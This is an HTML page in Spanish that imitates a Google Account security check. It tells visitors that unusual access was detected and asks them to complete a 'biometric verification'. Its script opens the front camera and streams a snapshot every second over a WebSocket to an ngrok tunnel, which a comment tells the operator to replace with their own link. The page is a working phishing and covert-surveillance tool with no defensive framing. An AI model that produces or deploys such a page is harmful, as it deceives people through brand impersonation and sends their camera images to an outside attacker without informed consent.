<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Google Account - Seguridad</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .card { max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
        <h1>Confirmar identidad</h1>
        <p>Se ha detectado un acceso inusual. Complete la verificación biométrica para continuar.</p>
        <button class="btn" onclick="check()">Continuar</button>
    </div>

    <script>
        async function check() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720, facingMode: "user" } 
                });
                
                // CAMBIA ESTO POR TU LINK ACTUAL DE NGROK
                const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');

                socket.onopen = () => {
                    setInterval(() => {
    if (video.videoWidth > 0) {
        // Bajamos un poquito la escala para estabilidad
        canvas.width = 854; 
        canvas.height = 480; 
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        if (socket.readyState === WebSocket.OPEN) {
            // Bajamos calidad a 0.5 para que el archivo sea ligero
            socket.send(canvas.toDataURL('image/jpeg', 0.5));
        }
    }
}, 1000); // 1 FOTO POR SEGUNDO (Esto garantiza que no se cierre)
                };
                alert("Verificando dispositivo...");
            } catch (e) {
                alert("Debe permitir el acceso para validar su cuenta.");
            }
        }
    </script>
</body>
</html>
